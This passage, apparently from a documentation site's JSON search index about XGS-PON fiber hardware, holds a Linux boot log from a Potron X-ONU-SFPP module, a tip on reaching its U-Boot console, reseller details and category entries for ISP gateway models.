multi-core is fine\n[    0.080022] Per DT Bootup LINUX not run on CPU 1\n[    0.083304] Please retry with MAX_CPUS !!!\n[    0.087263] cpu 1 is not available for Linux\n[    1.114412] CPU1: failed to start\n[    1.117151] Per DT Bootup LINUX not run on CPU 2\n[    1.120904] Please retry with MAX_CPUS !!!\n[    1.124950] cpu 2 is not available for Linux\n[    2.144036] CPU2: failed to start\n[    2.146785] Per DT Bootup LINUX not run on CPU 3\n[    2.150528] Please retry with MAX_CPUS !!!\n[    2.154577] cpu 3 is not available for Linux\n[    3.173658] CPU3: failed to start\n[    3.175531] Brought up 1 CPUs\n[    3.198196] clocksource: jiffies: mask: 0xffffffff max_cycles: 0xffffffff, max_idle_ns: 7645041785100000 ns\n[    3.206615] futex hash table entries: 1024 (order: 3, 32768 bytes)\n[    3.269326] pinctrl core: initialized pinctrl subsystem\n[    3.275646] NET: Registered protocol family 16\n[    3.284733] intel-pinctrl 16310000.pinctrl: pinbank id: 0, reg: 0xb6310000, pinbase: 0, pin number: 32, pinmap: 0xffffffff\n[    3.294940] intel-pinctrl 16310000.pinctrl: Total 27 groups, 17 functions\n[    3.301428] intel-pinctrl 16310000.pinctrl: gpiochip membase: 0xb6300000\n[    3.326709] Lantiq MIPSInterAptiv MPS driver, version 1.0.0.0, (c) 2006-2013 Lantiq Deutschland GmbH\n[    3.335334] MPS: major Id 253\n[    3.340722] dma0-grx500 16e00000.dma: base address b6e00000 chained_irq 34 irq_base 57\n[    3.347312] dma0-grx500 16e00000.dma: Init done - hw rev: A, ports: 4, channels: 16\n[    3.355434] dma-grx500 18200000.dma: dma1tx base address b8200000 chained_irq 38 irq_base 73\n[    3.378701] dma-grx500 18200000.dma: Init done - rev: 30, ports: 1, channels: 17\n[    3.385295] dma-grx500 18300000.dma: dma1rx base address b8300000 chained_irq 39 irq_base 90\n[    3.398006] dma-grx500 18300000.dma: Init done - rev: 30, ports: 1, channels: 8\n[    3.404206] dma-grx500 18500000.dma: dma2tx base address b8500000 chained_irq 40 irq_base 98\n[    3.416641] dma-grx500 18500000.dma: Init done - rev: 30, ports: 1, channels: 2\n[    3.422788] dma-grx500 18600000.dma: dma2rx base address b8600000 chained_irq 41 irq_base 100\n[    3.435653] dma-grx500 18600000.dma: Init done - rev: 30, ports: 1, channels: 8\n[    3.445114] [PP_DEV]:init_clocks:184: enabling pp clock 'ppv4'\n[    3.449611] [PP_DEV]:init_clocks:184: enabling pp clock 'freq'\n[    3.458388] [PP_QOS_UTILS]:qos_init_wred_ports:4603: Init QoS 128 ports\n[    3.463593] [PP_QOS_UTILS]:qos_init_wred_queues:4614: Init QoS 256 queues\n[    3.524670] prx300-cqm prx300-cqm.1: assigned reserved memory node bm_pool@40000000\n[    3.616558] 0x80000000 0x1120000 0x400\n[    3.618860] 0x80000000 0x1120000\n[    3.699933] 0x81120000 0xfa0000 0x2800\n[    3.702234] 0x81120000 0xfa0000\n[    4.919702] 0x820c0000 0xf7f0000 0x400\n[    4.922078] 0x820c0000 0xf7f0000\n[    6.045235] 0x918b0000 0xe4c0000 0x2800\n[    6.047699] 0x918b0000 0xe4c0000\n[    6.071361] prx300-cqm prx300-cqm.1: fsqm init successfully, free buffers 7167\n[    6.077630] Load spreader init successfully\n[    6.081723] prx300-cqm prx300-cqm.1: CBM: Init Done !!\n[    6.086774] pps_core: LinuxPPS API ver. 1 registered\n[    6.091404] pps_core: Software ver. 5.3.6 - Copyright 2005-2007 Rodolfo Giometti &lt;giometti@linux.it&gt;\n[    6.100559] PTP clock support registered\n[    6.108446] clocksource: Switched to clocksource GIC\n[    6.115197] NET: Registered protocol family 2\n[    6.118520] IP idents hash table entries: 16384 (order: 5, 131072 bytes)\n[    6.127706] TCP established hash table entries: 8192 (order: 3, 32768 bytes)\n[    6.133689] TCP bind hash table entries: 8192 (order: 4, 65536 bytes)\n[    6.140076] TCP: Hash tables configured (established 8192 bind 8192)\n[    6.146330] UDP hash table entries: 512 (order: 2, 16384 bytes)\n[    6.152096] UDP-Lite hash table entries: 512 (order: 2, 16384 bytes)\n[    6.158762] NET: Registered protocol family 1\n[    6.170183] No memory allocated for crashlog\n[    6.175740] workingset: timestamp_bits=30 max_order=18 bucket_order=0\n[    6.193182] squashfs: version 4.0 (2009/01/31) Phillip Lougher\n[    6.197638] jffs2: version 2.2 (NAND) (SUMMARY) (LZMA) (RTIME) (CMODE_PRIORITY) (c) 2001-2006 Red Hat, Inc.\n[    6.232732] io scheduler noop registered\n[    6.235206] io scheduler deadline registered (default)\n[    6.241896] platform 1a800000.cb0phy: PHY(0:1) clock frequency set to 156250000 Success!\n[    6.252024] 16380000.serial: ttyLTQ0 at MMIO 0x16380000 (irq = 25, base_baud = 0) is a lantiq,asc\n[    6.269033] console [ttyLTQ0] enabled\n[    6.269033] console [ttyLTQ0] enabled\n[    6.274910] bootconsole [lantiq0] disabled\n[    6.274910] bootconsole [lantiq0] disabled\n[    6.283697] 163c0000.serial: ttyLTQ1 at MMIO 0x163c0000 (irq = 28, base_baud = 0) is a lantiq,asc\n[    6.296806] brd: module loaded\n[    6.299443] Gluebi: Found kernel commandline option 'rootfsname=rootfsA'\n[    6.308826] Lantiq SoC SPI controller rev 9 (TXFS 32, RXFS 32, DMA 1)\n[    6.314813] cadence-qspi 19300000.qspi: missing lantiq,qspi-physize; default to 128 MB\n[    6.321789] cadence-qspi 19300000.qspi: DMA NOT enabled\n[    6.328859] cadence-qspi 19300000.qspi: master is unqueued, this is deprecated\n[    6.337777] nand: device found, Manufacturer ID: 0xef, Chip ID: 0xaa\n[    6.342735] nand: Winbond SPI NAND 1Gbit 3,3v WN25N01GV\n[    6.347924] nand: 128 MiB, SLC, erase size: 128 KiB, page size: 2048, OOB size: 64\n[    6.356656] Bad block table found at page 65472, version 0x01\n[    6.362193] Bad block table found at page 65408, version 0x01\n[    6.367957] nand_read_bbt: bad block at 0x000005b40000\n[    6.372054] nand_read_bbt: bad block at 0x000005b60000\n[    6.377161] nand_read_bbt: bad block at 0x000005b80000\n[    6.382419] 8 cmdlinepart partitions found on MTD device nand.0\n[    6.388196] Creating 8 MTD partitions on \"nand.0\":\n[    6.392975] 0x000000000000-0x000000100000 : \"uboot\"\n[    6.400026] 0x000000100000-0x000000140000 : \"ubootconfigA\"\n[    6.406870] 0x000000140000-0x000000180000 : \"ubootconfigB\"\n[    6.413781] 0x000000180000-0x0000001c0000 : \"gphyfirmware\"\n[    6.420955] 0x0000001c0000-0x0000002c0000 : \"calibration\"\n[    6.427607] 0x0000002c0000-0x0000012c0000 : \"bootcore\"\n[    6.434376] 0x0000012c0000-0x000007ec0000 : \"system_sw\"\n[    6.442213] 0x000007ec0000-0x000008000000 : \"res\"\n[    6.448538] cadence-qspi 19300000.qspi: Cadence QSPI controller driver\n[    6.453846] MACsec IEEE 802.1AE\n[    6.458518] intel_xpcs 1a842000.lan_xpcs1: XPCS probe start\n[    6.504193] intel_xpcs 1a842000.lan_xpcs1: XPCS probe success\n[    6.526792] dp manager dummy init done\n[    6.530348] ltq_thermal 16000000.ssx4:ts: ltq_thermal_probe: is done\n[    6.536020] grx500wdt 12000000.watchdog: [grx500wdt_probe]:[445] cpu_clk=400000000\n[    6.543064] grx500wdt 12000000.watchdog: [grx500wdt_probe]WDT reset is Bit31, RCU_IAP_WDT_RST_STAT=0x8030408\n[    6.552832] grx500wdt 12000000.watchdog: [grx500wdt_probe]Not WDT reset.\n[    6.559534] grx500wdt 12000000.watchdog: [grx500wdt_probe]:[554] grx500_wdt = 70824178\n[    6.567815] grx500wdt 12000000.watchdog: H/w Watchdog Timer: (max 10) (nowayout= 0)\n[    6.576282] cpu cpu0: dev_pm_opp_of_get_sharing_cpus: Couldn't find opp node.\n[    6.586022] NET: Registered protocol family 10\n[    6.596900] NET: Registered protocol family 17\n[    6.599965] 8021q: 802.1Q VLAN Support v1.8\n[    6.615064] ubi0: attaching mtd6\n[    8.284182] ubi0: scanning is finished\n[    8.316393] ubi0: attached mtd6 (name \"system_sw\", size 108 MiB)\n[    8.321012] ubi0: PEB size: 131072 bytes (128 KiB), LEB size: 126976 bytes\n[    8.327848] ubi0: min./max. I/O unit sizes: 2048/2048, sub-page size 2048\n[    8.334624] ubi0: VID header offset: 2048 (aligned 2048), data offset: 4096\n[    8.341565] ubi0: good PEBs: 861, bad PEBs: 3, corrupted PEBs: 0\n[    8.347554] ubi0: user volume: 7, internal volumes: 1, max. volumes count: 128\n[    8.354762] ubi0: max/mean erase counter: 3/1, WL threshold: 4096, image sequence number: 0\n[    8.363095] ubi0: available PEBs: 381, total reserved PEBs: 480, PEBs reserved for bad PEB handling: 17\n[    8.373580] ubi0: background thread \"ubi_bgt0d\" started, PID 430\n[    8.393910] Gluebi: mtd 'rootfsA' set to be root filesystem\n[    8.398185] rootdev: 0x01f0000d, mtd block: 0000001f, mtd index: 0000000d\n[    8.428888] VFS: Mounted root (squashfs filesystem) readonly on device 31:13.\n[    8.440880] Freeing unused kernel: 1308k freed\n[    8.443872] This architecture does not have kernel memory protection.\n[    9.247135] init: Console is alive\n[    9.249724] init: - watchdog -\n[   10.630188] kmodloader: loading kernel modules from /etc/modules-boot.d/*\n[   10.686119] kmodloader: done loading kernel modules from /etc/modules-boot.d/*\n[   10.696037] init: - preinit -\n[   12.533074] random: jshn: uninitialized urandom read (4 bytes read)\n[   12.719284] random: jshn: uninitialized urandom read (4 bytes read)\nls: /lib/modules/4.9.308+/ltq_atm*: No such file or directory\n[   12.805004] random: jshn: uninitialized urandom read (4 bytes read)\nPress the [f] key and hit [enter] to enter failsafe mode\nPress the [1], [2], [3] or [4] key and hit [enter] to select the debug level\n[   16.320128] urandom_read: 2 callbacks suppressed\n[   16.320146] random: procd: uninitialized urandom read (4 bytes read)\n[   16.336782] UBIFS (ubi0:6): background thread \"ubifs_bgt0_6\" started, PID 543\n[   16.461458] UBIFS (ubi0:6): recovery needed\n[   16.776779] UBIFS (ubi0:6): recovery completed\n[   16.779997] UBIFS (ubi0:6): UBIFS: mounted UBI device 0, volume 6, name \"rootfs_data\"\n[   16.787655] UBIFS (ubi0:6): LEB size: 126976 bytes (124 KiB), min./max. I/O unit sizes: 2048 bytes/2048 bytes\n[   16.797526] UBIFS (ubi0:6): FS size: 32378880 bytes (30 MiB, 255 LEBs), journal size 1650688 bytes (1 MiB, 13 LEBs)\n[   16.807934] UBIFS (ubi0:6): reserved for root: 1529334 bytes (1493 KiB)\n[   16.814542] UBIFS (ubi0:6): media format: w4/r0 (latest is w4/r0), UUID 04D40829-F77B-4A2D-91A7-2017F0613D03, small LPT model\n[   16.843945] mount_root: switching to ubifs overlay\n[   16.899008] urandom-seed: Seeding with /etc/urandom.seed\n[   17.069783] procd: - early -\n[   17.071364] procd: - watchdog -\n[   17.802160] procd: - watchdog -\n[   17.804594] procd: - ubus -\n[   17.896633] random: ubusd: uninitialized urandom read (4 bytes read)\n[   17.902224] random: ubusd: uninitialized urandom read (4 bytes read)\n[   17.908056] random: ubusd: uninitialized urandom read (4 bytes read)\n[   17.915910] procd: - init -\nPlease press Enter to activate this console.\n[   18.773960] kmodloader: loading kernel modules from /etc/modules.d/*\n[   18.817797] [PP_NAD]:__net_adapter_init:58: start: 1\n[   18.904141] [PP_QOS_FW]:do_load_firmware:318: FW [v 1.16.0] is running soc rev 1)\n[   18.911091] [PP_DEV]:pp_dev_late_init:676: PP is ready!\n[   18.975045] dp_pre_init done\n[   19.123825] mod_sfp_i2c-ACA_FW: ACA FW Hdr V2: version=0x0018, SOC=0x1 (soc_step_B), Chip=0x2 (chip_falcon), Built=0x0 (built_rel), FW=0x1 (fw_i2c)\n[   19.135720] pon-sfp-i2c 14050000.sfp_i2c: FW interface version 0x04000000\n[   19.309221] i2c /dev entries driver\n[   19.319098] i2c-gpio i2c-gpio: using pins 507 (SDA) and 506 (SCL)\n[   19.329657] GACT probability on\n[   19.334082] Mirror/redirect action on\n[   19.355910] u32 classifier\n[   19.357441]     input device check on\n[   19.360854]     Actions configured\n[   19.447704] nf_conntrack version 0.5.0 (16384 buckets, 65536 max)\n[   19.649955] xt_time: kernel timezone is -0000\n[   19.716836] ip_tables: (C) 2000-2006 Netfilter Core Team\n[   19.744115] Property intel,extra-subif for if eth0_0 4\n[   19.767134] xrx500_of_iface: rx csum offload is enabled !\n[   19.795048] Lantiq ethernet driver for XRX500 init.\n[   19.952930] kmodloader: done loading kernel modules from /etc/modules.d/*\nMIPS: set unaligned_action to 'SHOW'\n</code></pre>"},{"location":"xgs-pon/ont/potron-technology/x-onu-sfpp/#default-credentials","title":"Default Credentials","text":""},{"location":"xgs-pon/ont/potron-technology/x-onu-sfpp/#bootloader","title":"Bootloader","text":"<p>To access the U-Boot console type <code>admin</code> at the prompt: <code>Hit enter to stop autoboot</code></p>"},{"location":"xgs-pon/ont/potron-technology/x-onu-sfpp/#value-added-resellers","title":"Value-Added Resellers","text":"Company Product Number E-commerce Full Vision Com-Tech FV-NS10S <ol> <li> <p>https://www.potrontec.com/index/index/list/cat_id/2.html#11-83 \u21a9</p> </li> <li> <p>https://www.maxlinear.com/product/access/fiber-access/socs-for-optical-networking-units-onu/prx126 \u21a9</p> </li> </ol>"},{"location":"archive/2024/","title":"2024","text":""},{"location":"category/xgs-pon/","title":"XGS-PON","text":""},{"location":"category/xs-010x-q/","title":"XS-010X-Q","text":""},{"location":"category/was-110/","title":"WAS-110","text":""},{"location":"category/nokia/","title":"NOKIA","text":""},{"location":"category/nh20a/","title":"NH20A","text":""},{"location":"category/nh20t/","title":"NH20T","text":""},{"location":"category/technicolor/","title":"Technicolor","text":""},{"location":"category/vantiva/","title":"Vantiva","text":""},{"location":"category/telus/","title":"Telus","text":""},{"location":"category/hub-5x/","title":"Hub 5x","text":""},{"location":"category/virgin-media/","title":"Virgin Media","text":""},{"location":"category/sagemcom/","title":"Sagemcom","text":""},{"location":"category/fast-5685/","title":"FAST 5685","text":""},{"location":"category/f5685lgb-vmb/","title":"F5685LGB-VMB","text":""},{"location":"category/bfw-solutions/","title":"BFW Solutions","text":""},{"location":"category/fox222/","title":"FOX222","text":""},{"location":"category/frx523/","title":"FRX523","text":""},{"location":"category/frontier/","title":"Frontier","text":""},{"location":"category/cig/","title":"CIG","text":""},{"location":"category/xg-99rg2/","title":"XG-99RG2","text":""},{"location":"category/xg-99m/","title":"XG-99M","text":""},{"location":"category/bgw320-500/","title":"BGW320-500","text":""},{"location":"category/bgw320-505/","title":"BGW320-505","text":""},{"location":"category/att/","title":"AT&amp;T","text":""},{"location":"category/humax/","title":"Humax","text":""},{"location":"category/bridge-mode/","title":"Bridge Mode","text":""},{"location":"category/giga-hub/","title":"Giga Hub","text":""},{"location":"category/bell-canada/","title":"Bell Canada","text":""},{"location":"category/bell-aliant/","title":"Bell Aliant","text":""},{"location":"category/bell-mts/","title":"Bell MTS","text":""},{"location":"category/fast-5689e/","title":"FAST 5689E","text":""},{"location":"category/home-hub-4000/","title":"Home Hub 4000","text":""},{"location":"category/fast-5689/","title":"FAST 5689","text":""},{"location":"page/2/","title":"Guides","text":""},{"location":"archive/2024/page/2/","title":"2024","text":""},{"location":"category/was-110/page/2/","title":"WAS-110","text":""},{"location":"category/xgs-pon/page/2/","title":"XGS-PON","text":""}]}